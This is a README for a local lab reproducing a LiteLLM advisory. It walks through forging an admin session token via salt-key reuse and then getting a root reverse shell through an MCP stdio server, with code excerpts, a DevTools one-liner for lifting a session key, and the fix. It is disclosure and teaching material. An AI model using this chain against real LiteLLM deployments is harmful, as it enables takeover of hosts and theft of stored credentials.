# GHSA-7hp6-4w63-5g45 — LiteLLM salt-key privilege escalation → RCE

A self-contained lab that reproduces, end to end, how an ordinary **`internal_user`**
of a LiteLLM proxy escalates to **`proxy_admin`** and then gets a **root reverse shell**
on the proxy host — using nothing but their own login session.

> **For local, authorized, educational use only.** Everything runs on your own machine
> against `localhost`. The same steps against a system you don't own are a crime, not a demo.

| | |
|---|---|
| Advisory | GHSA-7hp6-4w63-5g45 |
| Severity | **Critical, CVSS 9.9** (`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`) |
| Class | CWE-269 (Improper Privilege Mgmt) · CWE-345 (Insufficient Verification of Data Authenticity) · CWE-441 (Confused Deputy) |
| Affected | `>=1.91.0,<1.100.4`, `>=1.101.0,<1.101.3`, `>=1.102.0,<1.102.2`, `>=1.103.0,<1.103.1`, `1.104.0rc1` |
| Patched | `1.100.4` / `1.101.3` / `1.102.2` / `1.103.1` / `1.104.0rc2` |
| This lab uses | `ghcr.io/berriai/litellm:v1.103.0` (vulnerable) |

---

## Files (that's the whole lab)

| File | Purpose |
|---|---|
| `setup.sh` | Automated: writes the Docker files, starts the **vulnerable** LiteLLM + Postgres, provisions the low-priv user. `up` / `reset` / `down`. |
| `exploit_revshell.py` | The exploit: `internal_user` → `proxy_admin` → reverse shell. |
| `listener.sh` | Catches the reverse shell (`nc`). |
| `README.md` | This file. |

`setup.sh` generates `.lab/docker-compose.yml` + `.lab/config.yaml` on first run (inspect them there).

---

## Why this is a vulnerability (the root cause)

LiteLLM derives **one** symmetric key from `LITELLM_SALT_KEY` (falling back to the master key)
and uses it for **two jobs that belong in different trust domains**:

1. **Sealing secrets at rest** — provider keys, credentials, and key *metadata* are encrypted
   with `encrypt_value_helper()` / `decrypt_value_helper()`.
2. **Minting & validating UI/CLI session bearer tokens** — the *same* two functions.

There is no domain separation — no label, no per-use key, no authenticated context binding the
ciphertext to its purpose. So a ciphertext the server produces for job (1) is accepted as valid
input for job (2). That is a textbook **confused deputy / key-reuse** flaw:

> "Encrypt this secret for me" becomes "mint me a session token."

### The three pieces of the chain

**1. The sink — a bearer token is just decrypted salt-key JSON.**
`litellm/proxy/auth/user_api_key_auth.py`: for any bearer token that does **not** start with `sk-`
(and unless `EXPERIMENTAL_UI_LOGIN=false`, which is *unset/enabled by default* since 1.91.0), the
proxy treats it as an encrypted UI session:

```python
# user_api_key_auth.py  (~L1957)
if (valid_token is None
        and not api_key.startswith("sk-")
        and get_secret_bool("EXPERIMENTAL_UI_LOGIN") is not False):
    valid_token = ExperimentalUIJWTToken.get_key_object_from_ui_hash_key(api_key)
```
```python
# auth_checks.py  ->  get_key_object_from_ui_hash_key()
decrypted_token = decrypt_value_helper(hashed_token, key="ui_hash_key", exception_type="debug")
return UserAPIKeyAuth.model_validate(json.loads(decrypted_token))   # user_role trusted verbatim
```
Whatever `user_role` the decrypted JSON claims is trusted. Every field of `UserAPIKeyAuth` is
optional, so a minimal `{"user_role":"proxy_admin"}` is a complete, valid admin identity. (Leaving
`is_session_token` unset avoids a DB re-read that would overwrite the role; no `expires` avoids the
admin-expiry check.) **The attacker never needs the salt key — only one ciphertext the server was
willing to make for them.**

**2. The oracle — get the server to encrypt attacker-chosen JSON and hand it back.**
`POST /key/generate` (callable by an `internal_user`'s session) runs key metadata through
`encrypt_callback_vars()`:

```python
# key_management_endpoints.py  (~L431)
"metadata": encrypt_callback_vars(folded_metadata),
```
For any **sensitively-named** key (matched by `SensitiveDataMasker`: `secret`, `api_key`,
`password`, `token`, …) inside `metadata.logging[*].callback_vars` (or `callback_settings.callback_vars`),
it stores/returns:

```python
# callback_utils.py
_CALLBACK_VAR_ENCRYPTED_PREFIX + encrypt_value_helper(value)   # "litellm_enc::" + <salt-key ciphertext>
```
The attacker controls `value` completely, and the `/key/generate` **response is not decrypted**
(decryption only happens later, during real LLM calls), so the ciphertext comes straight back.

**They meet:** `encrypt_value_helper` and `decrypt_value_helper` are inverses under the same key.
Strip the `litellm_enc::` prefix off the returned value and you hold `decrypt`-openable ciphertext
of **your own chosen plaintext** — i.e. a forged session token.

**3. Admin → RCE via an MCP stdio server.**
As `proxy_admin`, `POST /v1/mcp/server` (admin-only) accepts a `stdio` server that LiteLLM launches
as a local subprocess. The command allowlist (`{npx,uvx,python,python3,node,docker,deno}`) validates
only `os.path.basename(command)`, so `python3 -c "<attacker code>"` passes — **arbitrary code
execution** on the proxy host. `GET /v1/mcp/server/health` triggers the spawn.

### End-to-end chain

```
internal_user session key
   │  POST /key/generate  metadata.logging[0].callback_vars.secret = '{"user_role":"proxy_admin"}'
   ▼
proxy encrypts with the salt key, returns  metadata...secret = "litellm_enc::<CIPHERTEXT>"
   │  strip "litellm_enc::"
   ▼
forged bearer token = <CIPHERTEXT>          (does NOT start with sk-)
   │  Authorization: Bearer <CIPHERTEXT>
   ▼
decrypt_value_helper(<CIPHERTEXT>) -> '{"user_role":"proxy_admin"}'  ->  UserAPIKeyAuth(PROXY_ADMIN)
   │  POST /v1/mcp/server (stdio, command=python3, args=["-c", <reverse shell>])   [admin only]
   │  GET  /v1/mcp/server/health            ← spawns the subprocess
   ▼
reverse shell as root on the proxy host
```

---

## Reproduce it

### 0. Prerequisites
Docker Desktop running, plus `python3` and `nc` (both stock on macOS).

### 1. Start the vulnerable lab
```bash
./setup.sh
```
This pulls `litellm:v1.103.0`, starts it with Postgres, waits for health, and provisions the
low-priv user. It prints the UI creds and a quick-test key. UI: `http://localhost:4000/ui`,
`alice@corp.example` / `DemoPassw0rd!23` (role `internal_user`).

### 2. Start the listener (terminal A)
```bash
./listener.sh 4444
```

### 3. Run the exploit (terminal B)

**Quick path (no UI):** uses the convenience key `setup.sh` wrote to `.attacker_key`.
```bash
python3 exploit_revshell.py --lport 4444 --slow
```

**Realistic path (what an attacker actually has — an internal_user's own login session):**
1. Browse `http://localhost:4000/ui`, sign in as `alice@corp.example` / `DemoPassw0rd!23`.
2. Open DevTools (`Cmd+Opt+I`) and grab alice's session key:
   - **Network tab:** click any `localhost:4000` request (e.g. `key/list`) → **Request Headers** →
     copy the value after `Authorization: Bearer ` (starts with `sk-`); **or**
   - **Console tab (fastest):** `copy(JSON.parse(atob(sessionStorage.token.split('.')[1])).key)`
     — the key is now on your clipboard.
3. Run it:
   ```bash
   python3 exploit_revshell.py --key sk-<alice-session-key> --lport 4444 --slow
   ```

> Note: a key alice *creates herself* in the UI ("+ Create New Key") is capped to the **"AI APIs"**
> route bucket (LLM calls only) — non-admins are hard-blocked from minting Management keys — so a
> *created* key can't reach `/key/generate`. Her **login session** key can, which is why that's the
> credential to use. Either credential resolves to her `internal_user` identity, so step `[0]`
> still shows **HTTP 403** before the exploit flips it to **200**.

### 4. Watch it land
The exploit prints its steps: `[0]` 403 (not admin) → `[1]` the `litellm_enc::` blob →
`[3]` **200 (admin)** → `[4]/[5]` register + trigger the MCP server. Terminal A gets a root shell:
```
bash-5.3# id
uid=0(root) gid=0(root) ...
```

### 5. Reset / tear down
```bash
./setup.sh reset     # wipe DB + restart clean (between runs)
./setup.sh down      # stop everything and remove volumes
```

---

## The fix, and mitigation without upgrading

**Patched in 1.103.1+.** The fix adds `encrypt_bearer_token` / `decrypt_bearer_token` that bind a
distinct `litellm_login_` prefix as **AES-GCM AAD** (additional authenticated data) on the
session-token path. Because the login path now authenticates that domain tag, a ciphertext produced
by the generic at-rest encryption path (which lacks the AAD) no longer validates as a session token —
the two uses of the key are finally separated. On a patched build the identical exploit fails at the
escalation step with **HTTP 401** ("expected to start with `sk-`"). *(Verify it yourself by setting
`IMAGE="ghcr.io/berriai/litellm:v1.103.1"` at the top of `setup.sh` and re-running.)*

**Can't upgrade yet?** Set `EXPERIMENTAL_UI_LOGIN=false`. This disables the vulnerable
decrypt-the-bearer path (at the cost of the UI SSO / CLI gateway login flow).

---

## Notes / gotchas baked into this lab
- **Password ≥ 12 chars** — LiteLLM rejects shorter ones (400).
- **MCP server name can't contain `-`** — the exploit uses a dash-free id.
- **Proxy would crash ~30s after the attack (exit 137)** because LiteLLM re-spawns DB-stored stdio
  servers on its periodic reload and the broken handshake kills the worker. The exploit **deletes the
  MCP server right after triggering it once**, so there's nothing to re-spawn; the already-detached
  reverse shell is unaffected and the proxy stays healthy.
- The reverse-shell payload double-forks + `setsid` + `pty.spawn(bash -i)` so the shell detaches
  (reparented to PID 1) and survives LiteLLM reaping the managed MCP subprocess. It dials back to
  `host.docker.internal:<port>` (the container → your host).
